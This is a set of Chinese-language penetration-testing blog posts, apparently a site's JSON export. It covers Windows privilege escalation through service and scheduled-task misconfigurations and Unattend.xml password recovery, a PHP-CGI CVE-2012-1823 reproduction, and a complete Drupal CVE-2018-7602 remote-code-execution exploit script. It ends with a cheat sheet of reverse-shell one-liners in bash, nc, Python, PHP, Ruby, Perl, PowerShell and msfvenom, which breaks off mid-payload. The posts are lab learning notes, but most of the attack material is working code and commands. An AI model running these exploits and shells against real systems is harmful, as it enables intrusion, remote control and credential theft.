WhomaiTest 如下图完整利用过程： 可知提权前为管理员权限（liukaifeng01），提权成功后我们得到一个system权限的session。 这里也是解惑了，是我太傻，原来在上次执行CVE.exe之后，getuid便可以将提权结果展示在meterpreter中 这里要注意，新反弹得到的meterpreter会很快就中断了，这是因为当一个进程在Windows中启动后，必须与服务控制管理进行通信，如果没有通信，服务控制管理器会认为出现了错误，进而终止这个进程。所以，我们要在终止载荷进程之前将它迁移到其他进程中，使用msf的“set AutoRunScript migrate -f”命令即可实现自动迁移进程： 该提权方法在metasploit中对应的模块为：exploit/windows/local/unquoted_service_path，使用如下： （在之前的metasploit中为exploit/windows/local/trusted_service_path，但在新版的metasploit中替换替换成了exploit/windows/local/unquoted_service_path） use exploit/windows/local/unquoted_service_path set session 1 set AutoRunScript migrate -f exploit 如上图，提权成功 系统服务错误权限配置漏洞 Windows 系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件。因此，如果一个低权限的用户对此系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。**Windows 服务是以System权限运行的，因此，其文件、文件夹和注册表键值都是受强访问控制机制保护的。**但是，在某些情况下，操作系统中仍然存在一些没有得到有效保护的服务。 该漏洞利用有以下两种情况： 服务未运行：攻击者会使用任意服务直接替换原来的服务，然后重启服务。 服务正在运行且无法终止：这种情况符合绝大多数漏洞利用的场景，攻击者通常会利用DLL劫持技术并尝试重启服务来提权。 1. 利用PowerUp.ps1脚本 下载地址：https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp 这里我们利用一个Powershell的脚本——PowerUp，该脚本的AllChecks模块会检测目标主机存的Windows服务漏洞，然后通过直接替换可执行文件本身来实现权限的提升。 AllChecks模块的通常应用对象如下： 没有被引号引起来的服务的路径。 服务的可执行文件的权限设置不当 Unattend.xml文件 注册表键AlwaysInstallElevated 将该脚本远程下载或本地导入后，执行Invoke-AllChecks命令进行漏洞检测 powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/PowerUp.ps1');Invoke-ALLChecks\" 这里推荐先下载到本地，不过我这个靶机依旧没有此漏洞，这里就直接用他人的了 如上图，可以看到PowerUp列出了所有可能存在该漏洞的服务的信息，并在AbuseFunction部分直接给出了利用方式。我们可以看到，目标主机的WhoamiTest服务可能存在该漏洞，然后我们再用icacls命令来测试该服务的可执行文件目录的“C:\\Program Files\\Program Folder\\Hello Whoami\\whoami.exe”文件是否有写入权限： icacls \"C:\\Program Files\\Program Folder\\Hello Whoami\\whoami.exe\" 如上图，可以看到我们对whoami.exe文件是有完全控制权的，那么我们就可以直接将whoami.exe替换成我们的msf马，当服务重启时，我们就会得到一个System权限的meterpreter。 这里，我们用“AbuseFunction”那里已经给出的具体操作方式，执行如下。 将原来的服务可执行文件备份，并用一个可添加管理员用户的恶意可执行文件代替它，默认添加的用户名为join，密码为Password123!： powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/PowerUp.ps1');Install-ServiceBinary -ServiceName 服务名 接下来停止并再启动该服务的时候，但由于我们当前是普通用户，我们没有权限重启服务，所以我们可以等目标系统重启，我们通过msf控制目标机执行“shutdown -r”命令来重启，重启后即可成功创建join用户： 添加指定的管理员用户： Install-ServiceBinary -ServiceName 服务名 -UserName Bunny -Password Liufupeng123 执行命令： Install-ServiceBinary -ServiceName 服务名 -Command \"whoami\" // -Command后加要执行的命令 2. Metasploit中的service_permissions模块 该漏洞提权在metasploit上面对应的模块为exploit/windows/local/service_permissions： 如上图，该模块有两个可以设置的选项，其中如果把AGGRESSIVE选项设为“true”，则可以利用目标机器上每一个有该漏洞的服务，设为“false”则在第一次提权成功后就会停止工作。演示如下： （别忘了迁移进程哦~~） 0x04 计划任务与AccessChk使用 如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行我们的恶意程序。下面详细的进行演示。 首先可以利用如下命令查看计算机的计划任务： schtasks /query /fo list /v schtasks /query /fo list /v &gt; schtasks.txt 如上图，我们可以看到，在 C:\\Program Files\\schtasks\\whoami目录有一个test.exe程序，它会在一个时间点自动运行，它会在计算机每次启动时运行，并且是用SYSTEM权限运行的。然后让我们看下我们对这个计划任务的路径是否有写入权限。 我推荐使用AccessChk工具，其为SysInterals套件里的一个工具，常用于Windows中进行一些系统或程序的高级查询、管理和排除故障等。AccessChk是微软官方的工具，一般不会引起杀软的报警没所以常会被攻击者利用下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk 执行以下命令，查看指定目录的权限配置情况： accesschk.exe -dqv \"C:\\Program Files\\schtasks\\whoami\" -accepteula 可以清楚地看到，这里有一个很严重的配置错误，对于这个计划任务“test”来说，这里不仅用了system权限来运行，更糟糕的是，任何经过身份验证的用户（Authenticated Users）都对这个文件夹有写入的权限。所以，我们可以生成一个木马，做一个后门就可以了，在本次演示例子中，我们可以简单的用msf木马覆盖掉原来的“test.exe”，如下图我们将原来的test.exe备份后，上传我们自己生成的“test.exe”（msf木马）： 然后重开一个msfconsole，设置好监听，接下来对目标机执行重启命令“shutdown -r -t 0”让其重新启动： 重新启动目标主机后，在另一个msfconsole上面即可得到system权限的session： 成功。 AccessChk使用 通过上面的例子，我们可以看出accesschk称得上是查找有权限配置缺陷文件夹的必备工具，下面是accesschk的一些其他使用实例。 当第一次执行任何sysinternals工具包里的工具时，当前用户将会看到一个最终用户许可协议弹框，这是一个大问题，然而我们可以添加一个额外的参数“/accepteula”去自动接受许可协议，即： accesschk.exe /accepteula Accesschk可以自动的检查当我们使用一个特定的用户时，我们是否对Windows的某个服务有写的权限。当我们作为一个低权限用户，我们首先就想要看一下“Authenticated Users”组对这些服务的权限。 找出某个驱动器下所有权限配置有缺陷的文件夹路径 accesschk.exe -uwdqs Users c:\\ accesschk.exe -uwdqs \"Authenticated Users\" c:\\ 找出某个驱动器下所有权限配置有缺陷的文件 accesschk.exe -uwqs Users c:\\*.* accesschk.exe -uwqs \"Authenticated Users\" c:\\*.* 如上图可以看到对这个目录下的每一个文件它都列出了Authenticated Users用户组的权限，R为读权限，W为写权限，RW表示有读写权限，如果前面为空则表示没有权限。 根据前面这几个提权的思路，当我们检查文件或文件夹权限的时候，需要考虑哪些点是易受攻击的点。你需要花费时间来检查所有的启动路径，Windows服务，计划任务和Windows启动项等。 自动安装配置文件 网络管理员在内网中给多台机器配置同一个环境时，通常不会逐台配置，而是会采用脚本化批量部署的方法。在这一过程中，会使用安装配置文件。这些文件中包含所有的安装配置信息，其中的一些还可能包含本地管理员的账号和密码等信息。我们可以对整个系统进行检查，这些安装配置文文件列举如下： - C:\\sysprep.inf - C:\\syspreg\\sysprep.xml - C:\\Windows\\system32\\sysprep.inf - C:\\windows\\system32\\sysprep\\sysprep.xml - C:\\unattend.xml - C:\\Windows\\Panther\\Unattend.xml - C:\\Windows\\Panther\\Unattended.xml - C:\\Windows\\Panther\\Unattend\\Unattended.xml - C:\\Windows\\Panther\\Unattend\\Unattend.xml - C:\\Windows\\System32\\Sysprep\\Unattend.xml - C:\\Windows\\System32\\Sysprep\\Panther\\Unattend.xml 全盘搜索Unattend文件是个好办法，可以用以下命令来全盘搜索Unattend.xml文件： dir /b /s c:\\Unattend.xml /S：显示指定目录和所有子目录中的文件。 除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作系统时使用的凭据信息，这些信息可以帮助我们提权。 打开文件之后格式为xml格式然后可以进行搜索User、Accounts、UserAccounts、LocalAccounts、Administrator、Password或者经过base64加密的密码，因为我们只需要这部分，例如： ...... &lt;UserAccounts&gt; &lt;LocalAccounts&gt; &lt;LocalAccount&gt; &lt;Password&gt; &lt;Value&gt;UEBzc3dvcmQxMjMhUGFzc3dvcmQ=&lt;/Value&gt; &lt;PlainText&gt;false&lt;/PlainText&gt; &lt;/Password&gt; &lt;Description&gt;Local Administrator&lt;/Description&gt; &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt; &lt;Group&gt;Administrators&lt;/Group&gt; &lt;Name&gt;Administrator&lt;/Name&gt; &lt;/LocalAccount&gt; &lt;/LocalAccounts&gt; &lt;/UserAccounts&gt; ...... 在这个Unattend文件中，我们可以看到一个本地账户被创建并加入到了管理员组中。管理员密码没有以明文形式显示，但是显然密码是以Base64进行编码的。 echo \"UEBzc3dvcmQxMjMhUGFzc3dvcmQ=\" | base64 -d 解密得密码为\"P@ssword123!Password\"，但是微软在进行编码前会在Unattend文件中所有的密码后面都追加\"Password\"，所以我们本地管理员的密码实际上是\"P@ssword123!\"。 1. 在Metasploit中利用的相应模块为post/windows/gather/enum_unattend 这个模块仅仅只是搜索Unattend.xml文件，然而会忽略其他像syspref.xml和syspref.inf这样的文件。简而言之，这个模块就是全盘搜索Unattend.xml文件并读取出管理员账户密码。 2. PowerUp中利用的模块 powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://ip/powerup.ps1');Get-UnattendedInstallFile\" 0x04 后言 本节中，我们主要介绍了Windows系统内核溢出漏洞提权和windows系统错误配置漏洞提权的可信任服务路径漏洞提权、系统服务错误权限配置漏洞提权、自动安装配置文件提权。其中最常用的可能就是Windows系统内核溢出漏洞提权了，windows系统错误配置漏洞不仅可以用来提权，在获取高权限后还可以用来设置一个高权限后门，以备后用。 不过感觉我只是抄了一遍而已，因此我还是搞点靶场在实战中学习吧，毕竟靶场中肯定次次得提权。 想了想日后的提权文章，还是针对某种类型单独写出来吧，感觉效果会好一点。","tags":["Windows 提权"],"categories":["内网渗透"]},{"title":"PHP-CGI远程代码执行漏洞（CVE-2012-1823）","path":"/2023/09/19/php-cgi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2012-1823/","content":"0x01 漏洞介绍 这个漏洞简单来说，就是用户请求的querystring（querystring字面上的意思就是查询字符串，一般是对http请求所带的数据进行解析，这里也是指http请求中所带的数据）被作为了php-cgi的参数，最终导致了一系列结果。 影响范围： 漏洞影响版本 php &lt; 5.3.12 or php &lt; 5.4.2 PS:CVE-2012-1823是在php-cgi运行模式下出现的漏洞，其漏洞只出现在以cgi模式运行的php中 cgi模式下有如下可控命令行参数可用： -c 指定php.ini文件（PHP的配置文件）的位置 -n 不要加载php.ini文件 -d 指定配置项 -b 启动fastcgi进程 -s 显示文件源码 -T 执行指定次该文件 -h和-? 显示帮助 0x02 CGI简单介绍 - php-cgi是一个类似于消息的“传递者”，它接收web容器收到的http数据包，并把里面的数据交给PHP解释器执行。 - php-cgi有两个功能，一是提供cgi方式的交互，二是提供fastcgi方式的交互。 - cgi方式：web容器接收到http数据包后，拿到用户请求的文件（cgi脚本），并fork除一个子进程（解释器）去执行这个文件，然后拿到执行结果，直接返回给用户，然后子进程结束，但是这个cgi模式不能接收同时接收大量的请求，因为创建进程的时候会消耗服务器资源，资源也不是无限的，所以有了fastcgi 0x03 漏洞复现 配置好访问8080端口，如图则代表搭建成功 接下来是漏洞利用 1. 源码泄露 简单的利用方式就是-s可以直接显示源码 访问不同页面均能显示源码 2. 文件包含 -d参数就是文件包含 -d+allow_url_include%3don+-d+auto_append_file%3dphp://input 需要注意的是 =要用%3d(url编下码) 空格用+号代替或者%20 -d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input 上面两种都行只不过一个在页面顶部加载文件一个是页面底部加载文件 auto_prepend_file 在页面顶部加载文件 auto_append_file 在页面底部加载文件 我们url输入后抓包修改 3. 远程文件包含 payload: -d+allow_url_include%3don+-d+auto_prepend_file%3dhttp://ip/1.txt 上传之后尝试蚁剑连，链接地址为http://192.168.17.128:8080/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dhttp://ip/1.txt 4. 本地包含 payload: curl -H \"USER-AGENT:&lt;?php echo system($_GET[\"hk\"]);?&gt;\" url -d auto_prepend_file%3d/proc/self/environ+-n 这里介绍下/proc/self/environ在文件包含中的作用 如果服务器已过响应时间，还可以通过LFI重新利用，包括存储在User_Agent的/proc/self/environ文件，我们将把我们的PHP代码放置其中用于执行CMD命令 上述为bp抓包修改 不过我们还是可以进行本地包含的 使用curl来完成 payload: curl -H \"USER-AGENT:\" http://192.168.17.128:8080/index.php?-d+auto_prepend_file%3d/proc/self/environ+-n -o 1.txt 0x04 参考文章 （CVE-2012-1823）PHP-CGI远程代码执行漏洞 软件漏洞——PHP-CGI（CVE-2012-1823） --搭配msf反弹shell","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"Drupal 远程代码执行漏洞（CVE-2018-7602）","path":"/2023/09/19/drupal-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2018-7602/","content":"0x01 漏洞概述 ​ 这个漏洞是CVE-2018-7600的绕过利用，两个漏洞原理是一样的。攻击者可以通过不同方式利用该漏洞远程执行代码。CVE-2018-7602这个漏洞是CVE-2018-7600的另一个利用点，只是入口方式不一样。所以，一旦参数可控并且没有经过正确的过滤，就很有可能出问题。 0x02 影响版本 Drupal &lt; 7.58 Drupal &lt; 8.3.9 Drupal &lt; 8.4.6 Drupal &lt; 8.5.1 0x03 环境搭建 实战环境： 历史版本 https://www.drupal.org/project/drupal/releases 0x04 漏洞复现 这里直接用docker启动了 环境启动后访问如下链接，将会看到drupal的安装页面。如果没有mysql环境，安装的时候可以选择sqlite数据库。其他配置均默认即可。这里我选择sqlite ![image-20230919192154141](Drupal 远程代码执行漏洞（CVE-2018-7602）/image-20230919192154141.png) ![image-20230919192453204](Drupal 远程代码执行漏洞（CVE-2018-7602）/image-20230919192453204.png) 后面无脑默认 利用原理：对URL中的#进行编码两次，绕过sanitize()函数过滤 这里直接上poc了，项目地址：https://github.com/pimps/CVE-2018-7600 #!/usr/bin/env python3 import requests import argparse from bs4 import BeautifulSoup def get_args(): //获取参数 parser = argparse.ArgumentParser( prog=\"drupa7-CVE-2018-7602.py\", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50), epilog= ''' This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 &lt;= 7.58 using an valid account and poisoning the cancel account form (user_cancel_confirm_form) with the 'destination' variable and triggering it with the upload file via ajax (/file/ajax). ''') parser.add_argument(\"user\", help=\"Username\") //用户名 parser.add_argument(\"password\", help=\"Password\") //密码 parser.add_argument(\"target\", help=\"URL of target Drupal site (ex: http://target.com/)\") //目标 parser.add_argument(\"-c\", \"--command\", default=\"id\", help=\"Command to execute (default = id)\") //参数 parser.add_argument(\"-f\", \"--function\", default=\"passthru\", help=\"Function to use as attack vector (default = passthru)\") parser.add_argument(\"-x\", \"--proxy\", default=\"\", help=\"Configure a proxy in the format http://127.0.0.1:8080/ (default = none)\") args = parser.parse_args() return args def pwn_target(target, username, password, function, command, proxy): requests.packages.urllib3.disable_warnings() //判断抓包无误 session = requests.Session() //获取seesion proxyConf = {'http': proxy, 'https': proxy} //none proxy try: print('[*] Creating a session using the provided credential...') get_params = {'q':'user/login'} //构造get post_params = {'form_id':'user_login', 'name': username, 'pass' : password, 'op':'Log in'} //构造post print('[*] Finding User ID...') session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf) //构造postseesion get_params = {'q':'user'} r = session.get(target, params=get_params, verify=False, proxies=proxyConf) //构造getseesion soup = BeautifulSoup(r.text, \"html.parser\") //爬取页面 user_id = soup.find('meta', {'property': 'foaf:name'}).get('about') //抓关键字 if (\"?q=\" in user_id): user_id = user_id.split(\"=\")[1] //以=作分隔符，再通过索引[1]取出所得数组中的第二个元素的值 if(user_id): print('[*] User ID found: ' + user_id) //以上主要抓取user_id值 print('[*] Poisoning a form using \\'destination\\' and including it in cache.') get_params = {'q': user_id + '/cancel'} r = session.get(target, params=get_params, verify=False, proxies=proxyConf) soup = BeautifulSoup(r.text, \"html.parser\") form = soup.find('form', {'id': 'user-cancel-confirm-form'}) form_token = form.find('input', {'name': 'form_token'}).get('value') //以上主要获取form_token参数值 // %23是#的URL编码 //其中%2523是对#的两次URL编码 %25是%的URL编码 //例如：POST /drupal-7.59/drupal-7.59/node/9/delete?destination=node?q[%2523][]=passthru%26q[%2523type]=markup%26q[%2523markup]=id get_params = {'q': user_id + '/cancel', 'destination' : user_id +'/cancel?q[%23post_render][]=' + function + '&amp;q[%23type]=markup&amp;q[%23markup]=' + command } // # 绕过sanitize(),stripDangrousValues函数检查。 //在Drupal应用对destination URL进行处理时，会再次解码%23,获得# post_params = {'form_id':'user_cancel_confirm_form','form_token': form_token, '_triggering_element_name':'form_id', 'op':'Cancel account'} r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf) soup = BeautifulSoup(r.text, \"html.parser\") form = soup.find('form', {'id': 'user-cancel-confirm-form'}) form_build_id = form.find('input', {'name': 'form_build_id'}).get('value') //关键点是让系统缓存一个form_build_id，这个form存着我们传入的恶意参数，第二个请求从中取出来然后执行 //触发漏洞还是需要发两个post包，一个存入form_build_id一个取出后执行 if form_build_id: print('[*] Poisoned form ID: ' + form_build_id) print('[*] Triggering exploit to execute: ' + command) get_params = {'q':'file/ajax/actions/cancel/#options/path/' + form_build_id} post_params = {'form_build_id':form_build_id} r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf) parsed_result = r.text.split('[{\"command\":\"settings\"')[0] print(parsed_result) except: print(\"ERROR: Something went wrong.\") raise def main(): print () print ('===================================================================================') print ('| DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602) |') print ('| by pimps |') print ('=================================================================================== ') args = get_args() # get the cl args //return args pwn_target(args.target.strip(),args.user.strip(),args.password.strip(), args.function.strip(), args.command.strip(), args.proxy.strip()) //目标，用户名，密码，参数值 if __name__ == '__main__': main() 如图所示，执行以下命令即可复现该漏洞。 示例命令为 ，如图红框中显示，可以执行该命令 # \"id\"为要执行的命令 第一个drupal为用户名 第二个drupal为密码 python3 drupa7-CVE-2018-7602.py -c \"id\" hybcx 123456 http://192.168.17.128:8081/ ![image-20230919194317426](Drupal 远程代码执行漏洞（CVE-2018-7602）/image-20230919194317426.png) 查看内核版本 python3 drupa7-CVE-2018-7602.py -c \"uname -a\" hybcx 123456 http://192.168.17.128:8081/ ![image-20230919194404102](Drupal 远程代码执行漏洞（CVE-2018-7602）/image-20230919194404102.png) 查看敏感文件 python3 drupa7-CVE-2018-7602.py -c \"cat ../../../../../../../etc/passwd\" hybcx 123456 http://192.168.17.128:8081/ ![image-20230919194525463](Drupal 远程代码执行漏洞（CVE-2018-7602）/image-20230919194525463.png) 0x05 参考文章 CVE-2018-7602 DRUPAL 内核远程代码执行漏洞分析 --代码审计层面 Drupal 远程代码执行漏洞（CVE-2018-7602）","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"反弹shell的方法总结","path":"/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/","content":"一、前言 1. 什么是反弹shell 就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。 假设有两台主机 A(控制端) B(被控端) 正向shell，就是ssh、Telnet的连接，A主动发起连接B指定端口，然后A就可以通过命令控制B了 反弹shell，A先开启一个监听端口，让B去连接A的这个端口，连接成功后，A就能控制B了 2. 为什么需要反弹shell？ 反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。以下详细介绍Windows和Linux系统下反弹shell的几种方式。 二、反弹shell命令解析 1. 命令解析 例如：bash -i &gt;&amp; /dev/tcp/192.168.1.1/9090 0&gt;&amp;1 bash -i bash -i，意为创建一个交互式的bash shell /dev/tcp/192.168.1.1/9090 dev是设备(device)的英文缩写。这里主要存放与设备（包括外设）有关的文件 /dev/tcp/是linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，linux中还存在/dev/upd/ 所以上述命令是和192.168.1.1:9090建立TCP连接 虽然/dev/tcp/${HOST}/${PORT}这个字符虽然看起来像一个文件系统中的文件，并且位于/dev这个设备文件夹下 但是这个文件并不存在，并且不是一个设备文件。这只是bash实现的用来实现网络请求的一个接口，其实就像我们自己编写的一个命令行程序，按照指定的格式输入host port参数，就能发起一个socket连接 2. 文件描述符 Linux系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件 所有执行I/O操作的系统调用都会通过文件描述符，即文件描述符可控制输入输出（输出/输出重定向） 标准输入(stdin) 代码为0 使用&lt;或&lt;&lt; 默认设备键盘 标准输出(stdout) 代码为1 使用&gt;或&gt;&gt; 默认设备显示器 标准错误输出(stderr) 代码为2 使用2&gt;或2&gt;&gt; 默认设备显示器 大多数Linux系统命令从你的终端接受输入并将所产生的输出发送回到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输入写入到标准输出，默认情况下，这也是你的终端。 shell 输入/输出重定向 如上，我们正常使用终端执行命令时，默认输入输出皆是终端。 3. 输出重定向 顾名思义，就是将输出结果重定向到其他地方 1️⃣ 使用 1&gt; 将输出结果写入到指定文件中，文件不存在则创建文件，文件如果存在会覆盖原文件内容 1&gt; 中的1是默认的可以忽略不写，也就是可以写成&gt; 同理0&lt;可以写成&lt; 2️⃣ 使用&gt;&gt;会追加内容在文件末尾 3️⃣实例 控制端：kali 被控端：centos kali监听8888端口 centos输入命令 echo hello &gt; /dev/tcp/192.168.17.128/8888 kali监听到输出结果 4. 输入重定向 kali继续监听端口，centos输入命令 bash -i &gt; /dev/tcp/192.168.17.128/8888 kali得到输出结果 这种方法的话，centos输一条命令，kali则回显一条命令输出结果 输入输出结合获得shell 两条命令 bash -i &gt; /dev/tcp/192.168.17.128/8888 bash -i &lt; /dev/tcp/192.168.17.128/8888 结合一下，即可实现反弹shell bash -i &gt;&amp; /dev/tcp/192.168.17.128/8888 0&gt;&amp;1 1️⃣ 0&gt;&amp;1 语法格式是 &gt;&amp;word 当word为数字或者-时，表示复制文件描述符 复制格式有num1&lt;&amp;num2和num1&gt;&amp;num2，区别是，前者是以只读的形式打开，后者是以写的形式打开，这里两者均可 0&gt;&amp;1这里意思是将0[标准输入]重定向到了1[标准输出]指向的位置 2️⃣ &gt;&amp; 当word不是数字或-字符时，&gt;&amp;表示将标准错误输出合并到标准输出中 三、linux下反弹shell 实验环境： Win10 192.168.17.135 NC监听 Kali 192.168.17.128 自带工具 1. bash反弹 bash -i &gt;&amp; /dev/tcp/192.168.17.135/7777 0&gt;&amp;1 这里也是崩溃了，第一种反弹方法就遇到了障碍，我发现我的kali用不了上述的方法，它表明/dev/tcp文件不存在，网上漫游发现 linux中有一个特殊的文件/dev/tcp,打开这个文件就类似于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。 但是/dev/tcp本身是不存在的，无法在/dev下看到这个设备节点。 而在bash中通过打开/dev/tcp来取得socket的功能实际上是bash的特性，并不是系统的功能。 于是有些版本的bash可能默认不支持对/dev/tcp的打开。此时可以在编译bash的时候增加一个参数：–enable-net-redirections然后重新编译bash即可。 但我没有增加参数，因为我当时认为我bash版本应该很高，已经默认开启了这个选项 ，于是我跟着文章查看了当前shell环境，发现为zsh，于是我新建了一个用户用于永久使用bash命令。参考文章在下面 但有强迫症的我，接着根据几个关键词搜寻linux下如何切换shell环境，终于找到了永久切换文章，这里也放到下面，也很简单，就几条命令而已 在特殊情况可以使用base64编码执行bash反弹shell bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEzNS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}' 在kali中执行会解析成编码前的bash命令 2. nc反弹 nc -e /bin/bash 192.168.17.135 8888 -e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。 3. curl反弹 Kali开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可。 开启apache可参考：Kali Linxu中打开Apache服务 curl 192.168.17.137/bash.html|bash //当前kali地址 4. whois反弹 whois -h 192.168.17.135 -p 4444 `pwd` //反弹的shell只能执行后面带的命令 5. python反弹 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.17.135\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 6. PHP反弹 php反弹shell和python的方式差不多 php -r '$sock=fsockopen(\"192.168.17.135\",8888);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' 7. ruby反弹 ruby -rsocket -e'f=TCPSocket.open(\"192.168.17.135\",8888).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)' 但这个语句似乎不能用了吧，报了如下错误 搜寻发现下列语句 ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"192.168.17.135\",\"8888\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' ruby -rsocket -e 'c=TCPSocket.new(\"192.168.17.135\",\"8888\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' 这两种方法均可 8. socat反弹 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.17.135:8888 但是乱码真的烦，我也没细究为何 9. Perl反弹 perl -e 'use Socket;$i=\"192.168.17.135\";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};' 四、Windows下反弹shell 1. powercat反弹 用IEX下载远程PS1脚本回来权限绕过执行 使用powershell执行IEX powershell IEX (New-Object System.Net.Webclient).DownloadString('https://github.com/besimorhino/powercat/blob/master/powercat.ps1');powercat -c 192.168.17.137 -p 8888 -e cmd 这里我也很头疼一直不成功，我感觉从网上下载绕过肯定可行，但似乎失误率很高，毕竟目标文件的格式很容易犯错，当然或许可以下载到本地或vps，通过局域网或者公网访问下载。这里我选择直接下载使用看看 powercat下载地址：https://github.com/besimorhino/powercat //下载到本地执行 powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat #导入模块 Import-Module .\\powercat.ps1 #如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码 Set-ExecutionPolicy Unrestricted #输入如下命令可以查看帮助信息 powercat -h 输入powercat -c 192.168.17.137 -p 8888 -e cmd 2. NC反弹 服务端反弹：nc 192.168.17.137 8888 -e c:\\windows\\system32\\cmd.exe 3. nishang反弹 Nishang下载地址：https://github.com/samratashok/nishang Nishang是一个基于PowerShell的攻击框架，整合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell 将nishang下载到攻击者本地，在目标机使用powershell执行以下命令 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.17.1/tools/nishang-master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.17.137 -port 8888 这里依旧不行，或许访问本地下载速度很慢，等了几分钟我也没见结果，因此还是直接下载到目标机执行吧。。。。 Import-Module .\\Invoke-PowerShellTcp.ps1 //导入模块 #如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码 Set-ExecutionPolicy Unrestricted Invoke-PowerShellTcp -Reverse -IPAddress 192.168.17.137 -port 8888 这个脚本linux、windows命令均可以使用 4. Reverse UDP shell 攻击机监听 nc -lvup 8888 利用上面下载的还是放在攻击机上在目标机中powershell执行以下命令 Import-Module .\\Invoke-PowerShellUdp.ps1 Invoke-PowerShellUdp -Reverse -IPAddress 192.168.17.137 -port 8888 这里我一直没通，以为是什么别的问题，看来还是浅薄了，这里的监听命令必须为nc -lvup port，我这里一直是vnp，查询了一番发现 -u：指定nc使用UDP协议，默认为TCP 参考：nc命令用法举例 5. MSF反弹 我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们需要的各类反弹一句话payload的路径信息。 msfvenom -l payloads | grep 'cmd/windows/reverse' 这里找powershell的payload 依照前面查找出的命令生成一句话payload路径，我们使用如下的命令生成反弹一句话，然后复制粘贴到靶机上运行即可。 msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.17.137 LPORT=8888 //host为被攻击机 powershell -w hidden -nop -c $a='192.168.17.137';$b=8888;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {start-sleep -m 100;if ($osread.IsCompleted -and $osread.Result -ne 0) {$r=$os.BaseStream.EndRead($osread);$s.Write($ob,0,$r);$s.Flush();$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, 